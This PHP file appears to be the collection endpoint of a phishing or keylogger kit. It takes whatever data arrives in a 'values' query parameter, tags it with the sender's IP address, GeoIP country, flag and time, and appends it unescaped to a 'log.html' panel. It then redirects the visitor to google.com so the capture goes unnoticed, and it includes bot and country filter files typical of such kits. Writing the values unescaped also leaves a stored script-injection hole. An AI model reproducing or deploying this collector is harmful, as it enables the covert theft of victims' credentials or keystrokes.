<?php

include "bots.php";
include "country/index.php";
    if($_GET){

        include 'geo/geoip.inc';
        $gi = geoip_open("geo/GeoIP.dat", "");

        $ip = $_SERVER['REMOTE_ADDR'] ;
        $date = new DateTime("now", new DateTimeZone('Africa/Dakar') ); //SET YOUR DATETIMEZONE HERE
        $d =  $date->format('d/m/Y H:i:s');
        $country = geoip_country_id_by_addr($gi, $ip);
        
        $flag = '<img src="img/flags/'.strtolower(geoip_country_code_by_addr($gi,$ip)).'.png">';

        $log = $_GET['values'];
        $txt = '<tr> <th scope="row">'.$ip.'<br>'.$geoplugin->countryName.'&nbsp;'.$flag.''.$d.' </th> <td width="100%" class="box3D"> '.$log.' </td> </tr>';
        $myfile = fopen("log.html", "a+") or die("Unable to open file!");
        fwrite($myfile, $txt);
        fclose($myfile);
        echo '<meta http-equiv="refresh" content=1;url="https://google.com">';
    }else{
        echo '<meta http-equiv="refresh" content=1;url="https://google.com">';
    }

?>